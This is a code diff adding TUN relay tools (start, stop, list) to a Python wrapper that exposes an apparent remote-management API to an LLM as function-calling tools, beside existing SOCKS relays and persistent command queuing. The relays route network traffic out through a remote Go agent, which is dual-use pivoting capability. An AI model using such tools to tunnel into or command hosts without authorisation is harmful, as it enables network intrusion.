@@ -298,6 +298,47 @@ def tool_list_socks(client: RmmApiClient) -> str:
     return _json_result({"ok": True, "count": len(relays), "relays": relays})
 
 
+def tool_start_tun(
+    client: RmmApiClient,
+    session_ref: str,
+    device: str,
+    route: str = "",
+    tun_address: str = "198.18.0.1/15",
+    interface: str = "",
+    mtu: int = 1500,
+    udp_timeout_seconds: int = 300,
+) -> str:
+    sid, _ = _resolve_session_id(client, session_ref)
+    if not sid:
+        return _json_result({"ok": False, "error": "session_not_found"})
+    code, data = client.start_tun(
+        sid,
+        device,
+        route=route,
+        tun_address=tun_address,
+        interface=interface,
+        mtu=mtu,
+        udp_timeout_seconds=udp_timeout_seconds,
+    )
+    return _json_result({"ok": code == 200, "status": code, "session_id": sid, "data": data})
+
+
+def tool_stop_tun(client: RmmApiClient, session_ref: str) -> str:
+    sid, _ = _resolve_session_id(client, session_ref)
+    if not sid:
+        return _json_result({"ok": False, "error": "session_not_found"})
+    code, data = client.stop_tun(sid)
+    return _json_result({"ok": code == 200, "status": code, "session_id": sid, "data": data})
+
+
+def tool_list_tun(client: RmmApiClient) -> str:
+    code, data = client.list_tun()
+    if code != 200:
+        return _json_result({"ok": False, "status": code, "data": data})
+    relays = data.get("relays", [])
+    return _json_result({"ok": True, "count": len(relays), "relays": relays})
+
+
 def tool_queue_persistent(client: RmmApiClient, session_ref: str, command: str) -> str:
     return tool_queue_command(client, session_ref, command, cmd_type="persistent")
 
@@ -486,6 +527,18 @@ TOOL_HANDLERS = {
     ),
     "stop_socks": lambda c, a: tool_stop_socks(c, a["session_ref"]),
     "list_socks": lambda c, a: tool_list_socks(c),
+    "start_tun": lambda c, a: tool_start_tun(
+        c,
+        a["session_ref"],
+        a["device"],
+        a.get("route", ""),
+        a.get("tun_address", "198.18.0.1/15"),
+        a.get("interface", ""),
+        int(a.get("mtu", 1500)),
+        int(a.get("udp_timeout_seconds", 300)),
+    ),
+    "stop_tun": lambda c, a: tool_stop_tun(c, a["session_ref"]),
+    "list_tun": lambda c, a: tool_list_tun(c),
     "queue_persistent": lambda c, a: tool_queue_persistent(
         c, a["session_ref"], a["command"]
     ),
@@ -775,6 +828,46 @@ OPENAI_TOOLS: list[dict] = [
         "function": {
             "name": "stop_socks",
             "description": "Stop SOCKS5 relay for the session.",
+            "parameters": {
+                "type": "object",
+                "properties": {"session_ref": {"type": "string"}},
+                "required": ["session_ref"],
+            },
+        },
+    },
+    {
+        "type": "function",
+        "function": {
+            "name": "list_tun",
+            "description": "List active RMM-owned TUN relays configured on the server.",
+            "parameters": {"type": "object", "properties": {}},
+        },
+    },
+    {
+        "type": "function",
+        "function": {
+            "name": "start_tun",
+            "description": "Create a server-side TUN relay whose traffic exits through a Go agent.",
+            "parameters": {
+                "type": "object",
+                "properties": {
+                    "session_ref": {"type": "string"},
+                    "device": {"type": "string", "description": "Server TUN device, for example tun://rmm0 or utun4"},
+                    "route": {"type": "string", "description": "Optional IPv4 CIDR routed through the agent"},
+                    "tun_address": {"type": "string", "description": "IPv4 address/prefix assigned to the TUN"},
+                    "interface": {"type": "string", "description": "Physical egress interface for the helper"},
+                    "mtu": {"type": "integer", "description": "TUN MTU"},
+                    "udp_timeout_seconds": {"type": "integer", "description": "UDP flow idle timeout"},
+                },
+                "required": ["session_ref", "device"],
+            },
+        },
+    },
+    {
+        "type": "function",
+        "function": {
+            "name": "stop_tun",
+            "description": "Disable the server-side TUN relay for a session.",
             "parameters": {
                 "type": "object",
                 "properties": {"session_ref": {"type": "string"}},
